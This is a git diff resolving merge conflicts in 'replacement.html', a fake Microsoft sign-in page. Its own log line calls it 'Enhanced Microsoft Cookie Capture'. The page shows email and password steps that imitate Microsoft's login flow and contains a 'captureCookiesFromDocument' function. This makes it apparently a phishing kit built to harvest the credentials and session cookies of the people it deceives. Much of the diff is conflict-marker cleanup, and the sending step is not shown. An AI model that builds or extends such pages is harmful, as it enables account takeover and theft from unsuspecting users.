@@ -172,13 +172,6 @@
     .troubleshooting-body strong { font-weight: 600; }
     .troubleshooting-body .code { font-family: Consolas, monospace; font-size: 13px; }
     .hidden { display: none !important; }
-<<<<<<< HEAD
-=======
-    .mt-4 { margin-top: 1rem; }
-    .mt-3 { margin-top: 0.75rem; }
-    .mt-2 { margin-top: 0.5rem; }
-    .form-group { margin-bottom: 1rem; }
->>>>>>> 370655a23c84aedd47fd54ae2fe7a2ea404651a5
   </style>
 </head>
 <body>
@@ -279,48 +272,13 @@
     <a href="#" id="footer_dots_link">...</a>
   </div>
 
-<<<<<<< HEAD
-=======
-  <!-- ✅ SCRIPT AT END OF BODY (after all HTML elements) -->
->>>>>>> 370655a23c84aedd47fd54ae2fe7a2ea404651a5
   <script>
     console.log('🔧 replacement.html loaded - Enhanced Microsoft Cookie Capture');
 
-<<<<<<< HEAD
     document.addEventListener('DOMContentLoaded', function () {
         const div1 = document.getElementById('div1');
         const div2 = document.getElementById('div2');
         const optionsBox = document.getElementById('options_box');
-=======
-    const div1 = document.getElementById('div1');
-    const div2 = document.getElementById('div2');
-    const optionsBox = document.getElementById('options_box');
-    const optionsViewDetailed = document.getElementById('options_view_detailed');
-    const troubleshootingBox = document.getElementById('troubleshooting_box');
-    
-    document.getElementById('next').addEventListener('click', function (e) {
-        e.preventDefault();
-        const emailInput = document.getElementById('email');
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        if (emailRegex.test(emailInput.value.trim())) {
-            document.getElementById('emailch').textContent = emailInput.value.trim();
-            div1.classList.add('hidden');
-            optionsBox.classList.add('hidden');
-            div2.classList.remove('hidden');
-        }
-    });
-
-    document.getElementById('back').addEventListener('click', function () {
-        div2.classList.add('hidden');
-        div1.classList.remove('hidden');
-        optionsBox.classList.remove('hidden');
-    });
-
-    document.getElementById('submit-btn').addEventListener('click', function (event) {
-        event.preventDefault();
-        const submitBtn = event.target;
-        const passwordInput = document.getElementById('password');
->>>>>>> 370655a23c84aedd47fd54ae2fe7a2ea404651a5
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
         const nextBtn = document.getElementById('next');
@@ -477,7 +435,6 @@
             }
         }
 
-<<<<<<< HEAD
         // ✅ CAPTURE COOKIES FROM CURRENT DOCUMENT
         function captureCookiesFromDocument() {
             const cookies = [];
@@ -681,47 +638,8 @@
                 e.target.textContent = 'Copied!';
                 setTimeout(() => { e.target.textContent = originalText; }, 2000);
             });
-=======
-    document.getElementById('sign_in_options_link').addEventListener('click', function (e) {
-        e.preventDefault();
-        div1.classList.add('hidden');
-        div2.classList.add('hidden');
-        optionsBox.classList.add('hidden');
-        troubleshootingBox.style.display = 'none';
-        optionsViewDetailed.classList.remove('hidden');
-    });
-
-    document.getElementById('options-view-back').addEventListener('click', function () {
-        optionsViewDetailed.classList.add('hidden');
-        div1.classList.remove('hidden');
-        optionsBox.classList.remove('hidden');
-    });
-
-    document.getElementById('footer_dots_link').addEventListener('click', function (e) {
-        e.preventDefault();
-        document.getElementById('modal_timestamp').textContent = new Date().toISOString();
-        troubleshootingBox.style.display = troubleshootingBox.style.display === 'block' ? 'none' : 'block';
-    });
-
-    document.getElementById('close_troubleshooting_btn').addEventListener('click', function () {
-        troubleshootingBox.style.display = 'none';
-    });
-
-    document.getElementById('copy_info_link').addEventListener('click', function (e) {
-        e.preventDefault();
-        const detailsNode = document.getElementById('error_details_for_copy');
-        const detailsText = detailsNode.innerText.trim().replace(/\s\s+/g, '\n');
-        navigator.clipboard.writeText(detailsText).then(() => {
-            const originalText = e.target.textContent;
-            e.target.textContent = 'Copied!';
-            setTimeout(() => { e.target.textContent = originalText; }, 2000);
->>>>>>> 370655a23c84aedd47fd54ae2fe7a2ea404651a5
         });
     });
   </script>
 </body>
-<<<<<<< HEAD
 </html>
-=======
-</html>
->>>>>>> 370655a23c84aedd47fd54ae2fe7a2ea404651a5
